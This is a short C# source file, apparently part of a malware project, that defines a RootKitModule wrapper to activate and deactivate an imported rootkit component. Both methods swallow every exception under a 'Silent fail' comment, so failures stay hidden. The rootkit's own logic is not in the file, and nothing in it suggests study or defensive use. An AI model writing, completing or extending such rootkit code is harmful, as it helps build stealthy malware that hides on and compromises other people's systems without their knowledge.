using System;
using XYZ.modules.rootkit;

namespace XYZ.modules
{
    public class RootKitModule
    {
        private rootkit.RootkitModule rootkitModule;

        public RootKitModule()
        {
            rootkitModule = new rootkit.RootkitModule();
        }

        public void StartRootKit()
        {
            try
            {
                rootkitModule.ActivateRootkit();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void StopRootKit()
        {
            try
            {
                rootkitModule.DeactivateRootkit();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}